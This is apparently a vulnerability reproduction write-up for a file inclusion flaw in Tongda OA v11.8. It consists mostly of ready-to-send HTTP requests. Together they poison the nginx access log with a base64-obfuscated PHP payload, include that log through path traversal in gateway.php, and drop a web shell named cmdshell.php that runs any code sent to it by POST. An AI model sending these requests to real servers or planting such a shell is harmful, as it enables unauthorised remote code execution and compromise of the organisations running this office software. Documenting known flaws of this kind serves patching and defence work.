# Tongda OA v11.8 getway.php remote file contains vulnerability

## Vulnerability Description

Tongda OA v11.8 getway.php has a file containing vulnerability. The attacker caused arbitrary file writing vulnerability by sending a malicious request to include log files.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Tongda OA v11.8</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628303888717-4ffc91a6-e87e-4e00-8bd5-b2218bb0772a-20220313173009245.png)

Send a malicious request to make the log be logged

```php
GET /d1a4278d?json={}&aa=<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?> HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628304243872-a7ae1965-2e21-4551-9d92-b42a3468617b.png)

Include log files through vulnerability

```php
POST /ispirit/interface/gateway.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

json={"url":"/general/../../nginx/logs/oa.access.log"}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628304347438-754f2570-1b25-4e9e-b822-ec78c2ca944a.png)

Send a malicious request to write to the file again

```php
POST /mac/gateway.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

json={"url":"/general/../../nginx/logs/oa.access.log"}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628304579748-4614da68-4756-43a6-b7c1-dc6e9e034819.png)

Access the written file `/mac/cmdshell.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628304836865-aee81900-a2a1-402c-9915-77a3d908e480.png)